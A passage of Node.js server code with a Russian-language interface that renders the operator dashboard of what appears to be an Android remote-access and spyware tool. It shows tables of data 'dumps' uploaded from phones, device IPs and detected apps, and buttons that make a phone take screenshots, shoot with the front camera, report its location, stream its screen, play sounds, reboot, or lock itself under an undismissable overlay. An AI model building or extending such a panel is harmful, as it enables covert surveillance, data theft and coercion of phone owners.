  const logs = cached('logs', 2000, () => readJSON(LOG_FILE, []).slice().reverse());
  const uploadLogs = cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, []).slice().reverse());
  const devices = deviceRegistry();
  const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
  const online = d => (Date.now() - d.lastSeen) < 60000;
  const ipOf = ip => S.hideIp ? '•••' : esc(ip);
  const k = encodeURIComponent(VIEW_KEY);

  const ov = renderOverview({ S, files, logs, uploadLogs, deviceList, ipOf, online, k });

  res.setHeader('Cache-Control', 'no-store');
  res.json({
    ok: true,
    overview: ov.html,
    stat: `<b>${deviceList.length}</b> устройств · <b>${deviceList.filter(online).length}</b> online`,
    counts: {
      dumps: files.length,
      control: deviceList.length,
      logs: logs.length,
      uploadlog: uploadLogs.length
    }
  });
});

app.get('/', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const S = readSettings();
  const tab = NAV.some(n => n.id === req.query.tab) ? req.query.tab : (S.startTab || 'overview');
  const selectedDevice = req.query.device || null;
  const page = Number(req.query.page) || 1;
  const k = encodeURIComponent(VIEW_KEY);

  const selfUrl = '/?key=' + k + '&tab=' + tab + (selectedDevice ? '&device=' + encodeURIComponent(selectedDevice) : '');

  const files = loadFiles();

  const logs = cached('logs', 2000, () => readJSON(LOG_FILE, []).slice().reverse());
  const uploadLogs = cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, []).slice().reverse());
  const devices = deviceRegistry();
  const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
  const onlineCount = deviceList.filter(d => (Date.now() - d.lastSeen) < 60000).length;
  const totalSize = files.reduce((s, f) => s + f.size, 0);
  const ipOf = ip => S.hideIp ? '•••' : esc(ip);
  const online = d => (Date.now() - d.lastSeen) < 60000;

  const thumbs = l => (S.showThumbs && l.file && l.fileType && l.fileType.includes('image'))
    ? `<div class="thumb"><img loading="lazy" src="${esc(l.file)}" onclick="window.open('${esc(l.file)}','_blank')"/></div>`
    : '';

  // ── overview ──
  const overviewHtml = renderOverview({ S, files, logs, uploadLogs, deviceList, ipOf, online, k }).html;

  // ── dumps ──
  const dumpsPage = paginate(files, page, S.pageSize);
  const dumpRows = dumpsPage.slice.map(f => `
    <tr>
      <td>
        <div class="cell-device">${avatar(f.device)}<span>${esc(f.device)}</span></div>
      </td>
      <td class="muted">${esc(f.android)}</td>
      <td class="mono muted">${ipOf(f.ip)}</td>
      <td class="num">${fmtSize(f.size)}</td>
      <td class="muted">${fmtTime(f.ts)}${S.relativeTime ? ` <span class="faint">${ago(f.ts)}</span>` : ''}</td>
      <td class="right nowrap">
        <a class="btn btn-ghost" href="/download/${encodeURIComponent(f.filename)}?key=${k}">${icon('download')}Скачать</a>
        <a class="btn btn-ghost btn-danger" href="/delete/${encodeURIComponent(f.filename)}?key=${k}" onclick="return confirm('Удалить дамп?')">${icon('trash')}</a>
      </td>
    </tr>`).join('');

  // ── logs ──
  const logsPage = paginate(logs, page, S.pageSize);
  const logRows = logsPage.slice.map(l => {
    if (l.type === 'cmd_result') {
      return `
      <tr>
        <td class="muted mono">${fmtTime(l.ts)}</td>
        <td><span class="tag">cmd</span> ${esc(l.cmd)}</td>
        <td>${pill(l.status, l.status === 'ok' ? 'ok' : 'bad')}</td>
        <td class="note">${l.note ? esc(l.note) : '<span class="faint">—</span>'}${thumbs(l)}</td>
        <td class="mono muted right">${ipOf(l.ip)}</td>
      </tr>`;
    }
    return `
      <tr>
        <td class="muted mono">${fmtTime(l.ts)}</td>
        <td>
          <div class="cell-device">${avatar(l.device)}<span>${esc(l.device)}</span></div>
        </td>
        <td class="muted">Android ${esc(l.android)} / ${esc(l.sdk)}</td>
        <td class="note">
          ${l.clients && l.clients.length ? `<span class="tag">${esc(l.clients.join(' · '))}</span>` : ''}
          ${l.zipSize ? `<span class="tag">${fmtSize(l.zipSize)}</span>` : ''}
          ${pill(l.ok ? 'sent' : 'fail', l.ok ? 'ok' : 'bad')}
          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
        </td>
        <td class="mono muted right">${ipOf(l.ip)}</td>
      </tr>`;
  }).join('');

  // ── upload logs ──
  const uplPage = paginate(uploadLogs, page, S.pageSize);
  const uploadRows = uplPage.slice.map(l => {
    const pct = l.totalBytes > 0 ? Math.min(100, (l.sentBytes / l.totalBytes) * 100) : 0;
    return `
      <tr>
        <td class="muted mono">${fmtTime(l.ts)}</td>
        <td><div class="cell-device">${avatar(l.device)}<span>${esc(l.device)}</span></div></td>
        <td class="mono muted">${esc(l.filename)}</td>
        <td>
          ${pill(l.stage, l.stage === 'done' ? 'ok' : l.stage === 'fail' ? 'bad' : '')}
          ${l.totalChunks ? `<span class="tag">${l.chunk}/${l.totalChunks}</span>` : ''}
          ${l.totalBytes ? `<div class="progress"><span style="width:${pct.toFixed(1)}%"></span></div><div class="sub mono">${fmtSize(l.sentBytes)} / ${fmtSize(l.totalBytes)} · ${pct.toFixed(1)}%</div>` : ''}
          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
        </td>
        <td class="mono muted right">${ipOf(l.ip)}</td>
      </tr>`;
  }).join('');

  // ── devices ──
  let controlHtml = '';
  if (!selectedDevice) {
    const cards = deviceList.map(d => `
      <a class="dev-card" href="/?key=${k}&tab=control&device=${encodeURIComponent(d.deviceId)}">
        <div class="dev-top">
          ${avatar(d.device)}
          <div class="dev-name">
            <b>${esc(d.device)}</b>
            <small class="mono">${esc(d.deviceId)}</small>
          </div>
          <span class="dot ${online(d) ? 'is-on' : ''}"></span>
        </div>
        <div class="dev-meta">
          <span>${esc(d.android)} · SDK ${esc(d.sdk)}</span>
          <span class="mono">${ipOf(d.ip)}</span>
        </div>
        <div class="dev-foot">
          <span class="chip">${esc((d.clients || []).join(', ') || '—')}</span>
          <span class="faint">${S.relativeTime ? ago(d.lastSeen) : fmtTime(d.lastSeen)}</span>
        </div>
      </a>`).join('');

    controlHtml = deviceList.length === 0
      ? `<div class="empty">${icon('control', 'empty-ico')}<h3>Устройств пока нет</h3><p>Телефон должен быть включён, приложение запущено и иметь интернет. Панель узнаёт устройство по запросу <code>/ping</code> (раз в 30 с), так что оно появится здесь в течение минуты.</p><p class="faint">Если панель лежит на бесплатном Render — она засыпает, и список устройств обнуляется при перезапуске. Телефон вернёт себя сам, как только снова выйдет на связь.</p></div>`
      : `<div class="dev-grid">${cards}</div>`;
  } else {
    const dev = devices[selectedDevice];
    if (!dev) {
      controlHtml = `<div class="empty">${icon('search', 'empty-ico')}<h3>Устройство не найдено</h3><a class="link" href="/?key=${k}&tab=control">← ко всем устройствам</a></div>`;
    } else {
      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result');
      const dl = paginate(devLogs, page, S.pageSize);
      const q = `key=${k}&device=${encodeURIComponent(selectedDevice)}`;

      controlHtml = `
        <a class="back" href="/?key=${k}&tab=control">${icon('back')}Все устройства</a>
        <section class="dev-hero">
          ${avatar(dev.device)}
          <div class="dev-hero-main">
            <h2>${esc(dev.device)}</h2>
            <div class="dev-hero-sub mono">${esc(dev.deviceId)} · ${ipOf(dev.ip)} · Android ${esc(dev.android)} (SDK ${esc(dev.sdk)})</div>
          </div>
          ${pill(online(dev) ? 'online' : 'offline', online(dev) ? 'ok' : 'bad')}
        </section>

        <div class="cmd-row">
          <a class="cmd-card" href="/cmd/send?${q}&cmd=screenshot">${icon('camera')}<span>Скриншот</span><small>screenshot</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=frontcam">${icon('user')}<span>Фронталка</span><small>frontcam</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=location">${icon('pin')}<span>Гео</span><small>location</small></a>
          <a class="cmd-card" href="/?key=${k}&tab=screen&device=${encodeURIComponent(selectedDevice)}">${icon('control')}<span>Экран</span><small>live view</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=sound">${icon('bolt')}<span>Звук</span><small>sound</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=stopsound">${icon('check')}<span>Стоп звук</span><small>stopsound</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=screenlock" onclick="return confirm('Заблокировать экран устройства? Выйти — только перезагрузка или screenunlock')">${icon('lock')}<span>Блок экрана</span><small>screenlock</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=screenunlock">${icon('unlock')}<span>Снять блок</span><small>screenunlock</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=reboot" onclick="return confirm('Перезагрузить устройство? Нужен root. Блокировка экрана снимется')">${icon('power')}<span>Перезагрузка</span><small>reboot</small></a>
          <a class="cmd-card" href="/cmd/send?${q}&cmd=lockstatus">${icon('logs')}<span>Статус лока</span><small>lockstatus</small></a>
        </div>

        ${(() => {
          const imgs = imageFiles();
          const cells = imgs.length
            ? imgs.map(i => `
              <div class="img-cell">
                <img src="/media/${encodeURIComponent(i.name)}" alt="" loading="lazy">
                <div class="img-meta mono" title="${esc(i.name)}">${esc(i.name.replace(/^\d+_/, ''))}</div>
                <div class="img-actions">
                  <a class="btn btn-sm" href="/cmd/send?${q}&cmd=image&name=${encodeURIComponent(i.name)}">На экран</a>
                  <a class="btn btn-ghost btn-sm btn-danger" href="/images/delete/${encodeURIComponent(i.name)}?key=${k}&device=${encodeURIComponent(selectedDevice)}" onclick="return confirm('Удалить картинку с сервера?')">×</a>
                </div>
              </div>`).join('')
            : '<div class="empty sm">картинок пока нет</div>';

          return `
          <section class="panel img-panel">
            <header class="panel-head"><h2>Картинка на экран</h2><span class="panel-hint">${imgs.length}</span></header>
            <form class="img-upload" method="post" action="/images/upload" enctype="multipart/form-data">
              <input type="hidden" name="key" value="${k}">
              <input type="hidden" name="device" value="${esc(selectedDevice)}">
              <input type="file" name="file" accept="image/*" required>
              <button class="btn btn-sm" type="submit">Загрузить</button>
            </form>
            <div class="img-grid">${cells}</div>
            <div class="panel-foot">
              <span class="hint">Картинка висит поверх всего: тачи съедаются, кнопки и шторка не работают. Снять — кнопкой ниже или перезагрузкой.</span>
              <a class="btn btn-ghost btn-sm btn-danger" href="/cmd/send?${q}&cmd=imagehide">Убрать с экрана</a>
            </div>
          </section>`;
        })()}

        ${(() => {
          const pend = readCmds()[selectedDevice] || [];
          if (!pend.length) return '';
          return `
          <section class="panel">
            <header class="panel-head"><h2>Очередь команд</h2><span class="panel-hint">${pend.length}</span></header>
            <div class="table-wrap"><table>
              <thead><tr><th>Поставлена</th><th>Команда</th><th class="right"></th></tr></thead>
              <tbody>${pend.map((c, i) => `
                <tr>
                  <td class="muted mono">${fmtTime(c.ts)}</td>
                  <td class="mono">${esc(c.cmd)}${c.name ? ' <span class="tag">' + esc(c.name) + '</span>' : ''}</td>
                  <td class="right"><a class="btn btn-ghost btn-sm btn-danger" href="/cmd/cancel?key=${k}&device=${encodeURIComponent(selectedDevice)}&i=${i}" onclick="return confirm('Снять команду?')">снять</a></td>
                </tr>`).join('')}</tbody>
            </table></div>
          </section>`;
        })()}

        ${(() => {
          // список = то, что реально лежит на устройстве (приходит в /ping) + то,
          // что лежит на сервере. Так новые звуки видны сразу после деплоя,
          // даже если телефон ещё не переподключался.
          const onDevice = new Set(Array.isArray(dev.sounds) ? dev.sounds : []);
          const onServer = new Set(soundNames());
          const all = Array.from(new Set([...onDevice, ...onServer])).sort();

          const opts = all.length
            ? all.map(s => `<option value="${esc(s)}">${esc(s)}</option>`).join('')
            : '<option value="">нет звуков</option>';

          const grid = all.map(s => {
            const here = onDevice.has(s);
            return `
              <button type="button" class="sound-item${here ? '' : ' is-away'}" data-preview="${esc(s)}"${onServer.has(s) ? '' : ' data-nofile="1"'} title="${here ? 'на устройстве' : 'нет на устройстве'}">
                <span class="sound-play">▶</span>
                <span class="sound-name mono">${esc(s)}</span>
                ${here ? '' : '<span class="sound-tag">нет на телефоне</span>'}
              </button>`;
          }).join('');

          return `
          <section class="panel sound-panel">
            <header class="panel-head">
              <h2>Звук</h2>
              <span class="panel-hint">${all.length} всего · ${onDevice.size} на устройстве</span>
            </header>
            <form class="sound-form" method="get" action="/cmd/send">
              <input type="hidden" name="key" value="${esc(VIEW_KEY)}"/>
              <input type="hidden" name="device" value="${esc(selectedDevice)}"/>
              <input type="hidden" name="cmd" value="sound"/>
              <select class="select" name="name">${opts}</select>
              <button class="btn btn-solid" type="submit">Играть</button>
              <button class="btn btn-ghost" type="button" id="snd-play-sel">▶ Прослушать</button>
              <a class="btn btn-ghost btn-danger" href="/cmd/send?${q}&cmd=stopsound">Стоп</a>
            </form>
            <div class="sound-grid">${grid || '<div class="mini-empty">Пусто</div>'}</div>
            <audio id="snd-preview" preload="none"></audio>
          </section>`;
        })()}

        <section class="panel">
          <header class="panel-head"><h2>Результаты команд</h2><span class="panel-hint">${devLogs.length}</span></header>
          ${devLogs.length === 0 ? '<div class="mini-empty">Пока ничего</div>' : `
          <div class="table-wrap"><table>
            <thead><tr><th>Время</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead>
            <tbody>${dl.slice.map(l => `
              <tr>
                <td class="muted mono">${fmtTime(l.ts)}</td>
                <td class="mono">${esc(l.cmd)}</td>
                <td>${pill(l.status, l.status === 'ok' ? 'ok' : 'bad')}</td>
                <td class="note">${thumbs(l)}${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<a class="btn btn-ghost btn-sm" href="${esc(l.file)}" target="_blank">открыть</a>` : ''}${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}</td>
              </tr>`).join('')}</tbody>
          </table></div>
          ${pagerHtml('/?key=' + k + '&tab=control&device=' + encodeURIComponent(selectedDevice), dl)}`}
        </section>`;
    }
  }

  // ── settings ──
  let settingsHtml = '';
  if (tab === 'settings') {
    const themeCards = THEMES.map(t => `
      <label class="theme-card ${S.theme === t.id ? 'is-active' : ''}">
        <input type="radio" name="theme" value="${t.id}" ${S.theme === t.id ? 'checked' : ''}/>
        <span class="theme-dots">
          <i style="background:${t.dot}"></i>
          <i style="background:${t.dot};opacity:.55"></i>
          <i style="background:${t.dot};opacity:.28"></i>
        </span>
        <span class="theme-name">${t.name}</span>
        <span class="theme-check">${S.theme === t.id ? icon('check') : ''}</span>
      </label>`).join('');

    const seg = (name, value, opts) => `
      <div class="seg">
        ${opts.map(o => `<label class="seg-item ${String(value) === String(o.v) ? 'is-active' : ''}">
          <input type="radio" name="${name}" value="${o.v}" ${String(value) === String(o.v) ? 'checked' : ''}/>${o.l}
        </label>`).join('')}
      </div>`;

    const toggle = (name, label, sub, checked) => `
      <label class="switch-row">
        <span class="switch-text"><b>${label}</b><small>${sub}</small></span>
        <input type="checkbox" name="${name}" ${checked ? 'checked' : ''}/>
        <span class="switch"></span>
      </label>`;

    settingsHtml = `
      ${req.query.saved ? `<div class="toast">${icon('check')}Настройки сохранены</div>` : ''}
      <form method="post" action="/settings" class="settings" data-settings-form>
        <input type="hidden" name="key" value="${esc(VIEW_KEY)}"/>

        <div class="preview" data-preview>
          <div class="preview-head">Предпросмотр</div>
          <div class="preview-body">
            <div class="preview-row"><span class="dot is-on"></span><b>SM-G998B</b><span class="preview-pill">sent</span></div>
            <div class="preview-row"><span class="dot"></span><b>Pixel 8 Pro</b><span class="preview-pill">12.4 MB</span></div>
          </div>
        </div>

        <h3 class="block-title">Тема</h3>
        <div class="theme-grid">${themeCards}</div>

        <div class="settings-cols">
          <div>
            <h3 class="block-title">Интерфейс</h3>
            <div class="panel panel-pad">
              <div class="set-row">
                <span class="switch-text"><b>Плотность</b><small>высота строк и отступы</small></span>
                ${seg('density', S.density, [{ v: 'normal', l: 'Обычная' }, { v: 'dense', l: 'Компактная' }])}
              </div>
              <div class="set-row">
                <span class="switch-text"><b>Размер шрифта</b><small>базовый кегль панели</small></span>
                ${seg('fontSize', S.fontSize, [{ v: 13, l: '13' }, { v: 14, l: '14' }, { v: 15, l: '15' }, { v: 16, l: '16' }])}
              </div>
              <div class="set-row">
                <span class="switch-text"><b>Строк на страницу</b><small>таблицы и логи</small></span>
                ${seg('pageSize', S.pageSize, [{ v: 25, l: '25' }, { v: 50, l: '50' }, { v: 100, l: '100' }, { v: 200, l: '200' }])}
              </div>
              <div class="set-row">
                <span class="switch-text"><b>Автообновление</b><small>перезагрузка страницы по таймеру</small></span>
                ${seg('autoRefresh', S.autoRefresh, [{ v: 0, l: 'Выкл' }, { v: 10, l: '10с' }, { v: 30, l: '30с' }, { v: 60, l: '60с' }])}
              </div>
              <div class="set-row">
                <span class="switch-text"><b>Стартовая вкладка</b><small>что открывается по ссылке без параметров</small></span>
                ${seg('startTab', S.startTab, [{ v: 'overview', l: 'Обзор' }, { v: 'dumps', l: 'Дампы' }, { v: 'control', l: 'Девайсы' }, { v: 'logs', l: 'Логи' }])}
              </div>
            </div>
          </div>

          <div>
            <h3 class="block-title">Отображение</h3>
            <div class="panel panel-pad">
              ${toggle('striped', 'Полосатые строки', 'чередование фона в таблицах', S.striped)}
              ${toggle('tableBorders', 'Разделители строк', 'горизонтальные линии в таблицах', S.tableBorders)}
              ${toggle('monoTables', 'Моноширинный шрифт в ячейках', 'удобно для id, IP и размеров', S.monoTables)}
              ${toggle('showThumbs', 'Превью изображений', 'показывать скриншоты в логах', S.showThumbs)}
              ${toggle('showChart', 'График на обзоре', 'активность за 14 дней', S.showChart)}
              ${toggle('relativeTime', 'Относительное время', 'добавлять «5m», «3h» рядом с датой', S.relativeTime)}
              ${toggle('hideIp', 'Скрывать IP', 'маскировать адреса в списках', S.hideIp)}
              ${toggle('railCompact', 'Компактное меню', 'только иконки в левой панели', S.railCompact)}
              ${toggle('glow', 'Фоновая подсветка', 'мягкое свечение сверху страницы', S.glow)}
            </div>
          </div>
        </div>

        <div class="set-actions">
          <button class="btn btn-solid" type="submit">Сохранить</button>
          <a class="btn btn-ghost" href="${selfUrl}">Сбросить</a>
          <span class="faint mono">panel.json · применяется сразу после сохранения</span>
        </div>
      </form>`;
  }

  const counts = {
    overview: null,
    dumps: files.length,
    control: deviceList.length,
    screen: null,
    logs: logs.length,
    uploadlog: uploadLogs.length,
    settings: null
  };

  const navHtml = NAV.map(n => `
    <a class="nav-item ${tab === n.id ? 'is-active' : ''}" href="/?key=${k}&tab=${n.id}" title="${n.label}">
      ${icon(n.id)}
      <span class="nav-label">${n.label}</span>
      <span class="nav-count" data-count="${n.id}"${counts[n.id] ? '' : ' style="display:none"'}>${counts[n.id] || ''}</span>
    </a>`).join('');

  const themeDots = THEMES.map(t => `
    <a class="theme-dot ${S.theme === t.id ? 'is-active' : ''}" title="${t.name}" style="--dot:${t.dot}"
       href="/theme/${t.id}?key=${k}&to=${encodeURIComponent(selfUrl)}"></a>`).join('');

  const searchable = tab === 'dumps' || tab === 'logs' || tab === 'uploadlog';
  const clearLink =
    tab === 'dumps' ? `<a class="btn btn-ghost btn-danger" href="/clear?key=${k}" onclick="return confirm('Удалить ВСЕ дампы?')">${icon('trash')}Очистить</a>` :
    tab === 'logs' ? `<a class="btn btn-ghost btn-danger" href="/clearlogs?key=${k}" onclick="return confirm('Удалить все логи?')">${icon('trash')}Очистить</a>` :
    tab === 'uploadlog' ? `<a class="btn btn-ghost btn-danger" href="/clearuploadlogs?key=${k}" onclick="return confirm('Удалить upload-логи?')">${icon('trash')}Очистить</a>` : '';

  // ── screen ──
  let screenHtml = '';
  if (tab === 'screen') {
    const dev = selectedDevice ? devices[selectedDevice] : null;
    if (!dev) {
      screenHtml = deviceList.length === 0
        ? `<div class="empty">${icon('control', 'empty-ico')}<h3>Нет устройств</h3><p>Подключи телефон и обнови страницу</p></div>`
        : `<div class="dev-grid">` + deviceList.map(d => `
            <a class="dev-card" href="/?key=${k}&tab=screen&device=${encodeURIComponent(d.deviceId)}">
              <div class="dev-top">
                ${avatar(d.device)}
                <div class="dev-name">
                  <b>${esc(d.device)}</b>
                  <small class="mono">${esc(d.deviceId)}</small>
                </div>
                <span class="dot ${online(d) ? 'is-on' : ''}"></span>
              </div>
              <div class="dev-meta">
                <span>${esc(d.android)} · SDK ${esc(d.sdk)}</span>
                <span class="mono">${ipOf(d.ip)}</span>
              </div>
              <div class="dev-foot">
                <span class="chip">смотреть экран →</span>
                <span class="faint">${S.relativeTime ? ago(d.lastSeen) : fmtTime(d.lastSeen)}</span>
              </div>
            </a>`).join('') + `</div>`;
    } else {
      queueCommand(selectedDevice, 'streamstart');
      screenHtml = `
        <a class="back" href="/?key=${k}&tab=screen">${icon('back')}Все устройства</a>
        <section class="panel">
          <header class="panel-head">
            <h2>${esc(dev.device)} · экран</h2>
            <div class="panel-actions">
              <span class="pill is-ok">live</span>
              <a class="btn btn-ghost btn-danger" href="/cmd/send?key=${k}&device=${encodeURIComponent(selectedDevice)}&cmd=streamstop">Стоп</a>
            </div>
          </header>
          <div class="screen-wrap">
            <img class="screen" data-stream="/stream/${encodeURIComponent(selectedDevice)}?key=${k}&t=${Date.now()}" alt="экран устройства"/>
          </div>
        </section>
        <p class="screen-hint">Трансляция идёт, пока открыта эта страница. Закроешь вкладку — телефон остановится сам.</p>`;
    }
  }

  let body = '';
  if (tab === 'overview') {
    body = `<div data-live="overview">${overviewHtml}</div>`;
  } else if (tab === 'screen') {
    body = screenHtml;
  } else if (tab === 'settings') {
    body = settingsHtml;
  } else if (tab === 'control') {
    body = controlHtml;
  } else if (tab === 'uploadlog') {
    body = uploadLogs.length === 0
      ? `<div class="empty">${icon('uploadlog', 'empty-ico')}<h3>Загрузок пока нет</h3><p>Здесь появятся чанки из <code>/log/upload</code></p></div>`
      : `<div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Устройство</th><th>Файл</th><th>Статус</th><th class="right">IP</th></tr></thead>
          <tbody>${uploadRows}</tbody>
        </table></div>${pagerHtml(selfUrl, uplPage)}`;
  } else if (tab === 'logs') {
    body = logs.length === 0
      ? `<div class="empty">${icon('logs', 'empty-ico')}<h3>Логов пока нет</h3><p>Каждый <code>/log</code> от устройства оставит здесь запись</p></div>`
      : `<div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Устройство</th><th>Система</th><th>Детали</th><th class="right">IP</th></tr></thead>
          <tbody>${logRows}</tbody>
        </table></div>${pagerHtml(selfUrl, logsPage)}`;
  } else {
    body = files.length === 0
      ? `<div class="empty">${icon('dumps', 'empty-ico')}<h3>Дампов пока нет</h3><p>Архивы приходят на <code>POST /upload</code></p></div>`
      : `<div class="table-wrap"><table>
          <thead><tr><th>Устройство</th><th>Android</th><th>IP</th><th>Размер</th><th>Время</th><th class="right"></th></tr></thead>
          <tbody>${dumpRows}</tbody>
        </table></div>${pagerHtml(selfUrl, dumpsPage)}`;
  }

  const toolbar = (searchable || clearLink) ? `
    <div class="toolbar">
      ${searchable ? `<label class="search">${icon('search')}<input data-search placeholder="Поиск по таблице…" autocomplete="off"/><kbd>/</kbd></label>` : '<span></span>'}
      <div class="toolbar-right">
        <a class="btn btn-ghost" href="${selfUrl}">${icon('refresh')}Обновить</a>
        ${clearLink}
      </div>
    </div>` : '';

  const bodyClass = [
    't-' + S.theme,
    S.density === 'dense' ? 'is-dense' : '',
    S.striped ? 'is-striped' : '',
    S.monoTables ? 'is-mono-tables' : '',
    S.railCompact ? 'is-rail-compact' : '',
    S.tableBorders ? '' : 'is-no-borders',
    S.glow ? '' : 'is-flat'
  ].filter(Boolean).join(' ');

  const paletteItems = [
    ...NAV.map(n => ({ href: '/?key=' + k + '&tab=' + n.id, label: n.label, hint: 'раздел' })),
    ...deviceList.map(d => ({ href: '/?key=' + k + '&tab=control&device=' + encodeURIComponent(d.deviceId), label: d.device, hint: d.deviceId }))
  ];

  const paletteHtml = paletteItems.map((it, i) => `
    <a class="pal-item" data-pal href="${it.href}">
      <span class="pal-label">${esc(it.label)}</span>
      <span class="pal-hint mono">${esc(it.hint)}</span>
    </a>`).join('');

  const html = `<!doctype html>
<!-- panel v3 -->
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#0b0b0b">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230b0b0b'/%3E%3Cpath d='M16 6l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10v-6z' fill='none' stroke='%23fff' stroke-width='2'/%3E%3Ccircle cx='16' cy='15' r='2.4' fill='%23fff'/%3E%3C/svg%3E">
<title>${TITLES[tab]} — Panel</title>
<style>
*,*::before,*::after{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;background:var(--bg);color:var(--fg);
  font:var(--fs)/1.55 ui-sans-serif,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,system-ui,sans-serif;
  -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
  letter-spacing:-0.005em;
}
body::after{
  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background:
    radial-gradient(900px 420px at 12% -8%,var(--wash),transparent 65%),
    radial-gradient(700px 380px at 100% 0%,var(--wash),transparent 60%);
}
::selection{background:var(--accent);color:var(--accent-fg)}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
a{color:inherit;text-decoration:none}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-thumb{background:var(--line-2);border:3px solid var(--bg);border-radius:99px}
::-webkit-scrollbar-track{background:transparent}
code,.mono{font-family:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,monospace;font-size:calc(var(--fs) - 1.5px)}
.faint{color:var(--fg-3)}
.muted{color:var(--fg-2)}
.num{font-variant-numeric:tabular-nums}
.right{text-align:right}
.nowrap{white-space:nowrap}
.ico{width:18px;height:18px;flex:none;display:block}

/* ── layout ── */
.shell{display:flex;min-height:100vh;position:relative;z-index:1}
.rail{
  width:248px;flex:none;display:flex;flex-direction:column;gap:2px;
  padding:18px 14px;border-right:1px solid var(--line);background:var(--bg-2);
  position:sticky;top:0;height:100vh;
}
.brand{display:flex;align-items:center;gap:10px;padding:4px 8px 18px}
.brand-mark{
  width:30px;height:30px;border-radius:9px;display:grid;place-items:center;
  background:var(--accent);color:var(--accent-fg);font-weight:800;font-size:14px;
  box-shadow:0 6px 20px -8px var(--accent);
}
.brand-text b{display:block;font-size:12.5px;letter-spacing:.2em;font-weight:700;color:var(--strong)}
.brand-text small{display:block;font-size:10px;color:var(--fg-3);letter-spacing:.08em;margin-top:1px}
.nav{display:flex;flex-direction:column;gap:2px;margin-top:4px}
.nav-item{
  display:flex;align-items:center;gap:10px;padding:9px 11px;border-radius:9px;
  color:var(--fg-2);font-size:13px;font-weight:500;transition:background .14s,color .14s;
  position:relative;
}
.nav-item:hover{background:var(--hover);color:var(--fg)}
.nav-item.is-active{background:var(--accent);color:var(--accent-fg);font-weight:600}
.nav-item.is-active .nav-count{color:var(--accent-fg);opacity:.7}
.nav-label{flex:1}
.nav-count{font-size:11px;font-variant-numeric:tabular-nums;color:var(--fg-3)}
.rail-foot{margin-top:auto;padding:14px 8px 4px;border-top:1px solid var(--line)}
.rail-foot .stat{font-size:11.5px;color:var(--fg-3);margin-bottom:12px}
.rail-foot .stat b{color:var(--fg);font-weight:600}
.theme-row{display:flex;gap:8px}
.theme-dot{
  width:16px;height:16px;border-radius:50%;background:var(--dot);opacity:.5;
  transition:transform .16s,opacity .16s,box-shadow .16s;
}
.theme-dot:hover{opacity:1;transform:scale(1.18)}
.theme-dot.is-active{opacity:1;box-shadow:0 0 0 2px var(--bg-2),0 0 0 3.5px var(--fg-2)}

.main{flex:1;min-width:0;display:flex;flex-direction:column}
.topbar{
  position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:18px;
  padding:18px 32px;border-bottom:1px solid var(--line);
  background:color-mix(in srgb,var(--bg) 86%,transparent);
  backdrop-filter:blur(14px) saturate(140%);
}
.topbar-title h1{font-size:19px;font-weight:700;letter-spacing:-.02em;color:var(--strong);margin:0}
.topbar-title p{margin:2px 0 0;font-size:12px;color:var(--fg-3)}
.topbar-actions{margin-left:auto;display:flex;align-items:center;gap:8px}
.kbd{
  font:600 10px/1 ui-monospace,Menlo,monospace;padding:4px 6px;border-radius:5px;
  border:1px solid var(--line);color:var(--fg-3);background:var(--panel);
}
.content{padding:26px 32px 72px;max-width:1420px;width:100%}

/* ── buttons ── */
.btn{
  display:inline-flex;align-items:center;justify-content:center;gap:7px;
  height:34px;padding:0 12px;border-radius:8px;border:1px solid var(--line-2);
  font:600 12.5px/1 inherit;color:var(--fg);background:transparent;cursor:pointer;white-space:nowrap;
  transition:background .14s,color .14s,border-color .14s,transform .1s;
}
.btn:hover{background:var(--hover);border-color:var(--fg-3)}
.btn:active{transform:translateY(1px)}
.btn .ico{width:15px;height:15px}
.btn-ghost{background:transparent}
.btn-danger:hover{color:#f2555a;border-color:#f2555a55;background:#f2555a14}
.btn-solid{background:var(--accent);color:var(--accent-fg);border-color:var(--accent)}
.btn-solid:hover{filter:brightness(1.07);background:var(--accent)}
.btn-sm{height:28px;padding:0 10px;font-size:11.5px}

/* ── toolbar ── */
.toolbar{display:flex;align-items:center;gap:10px;margin-bottom:14px}
.toolbar-right{margin-left:auto;display:flex;gap:8px}
.search{
  display:flex;align-items:center;gap:8px;height:34px;padding:0 10px;
  border:1px solid var(--line);border-radius:8px;background:var(--panel);
  min-width:280px;color:var(--fg-3);transition:border-color .15s,box-shadow .15s;
}
.search:focus-within{border-color:var(--fg-3);box-shadow:0 0 0 3px var(--hover)}
.search .ico{width:15px;height:15px}
.search input{
  border:0;background:transparent;color:var(--fg);font:inherit;font-size:12.5px;
  outline:none;flex:1;min-width:0;
}
.search input::placeholder{color:var(--fg-3)}

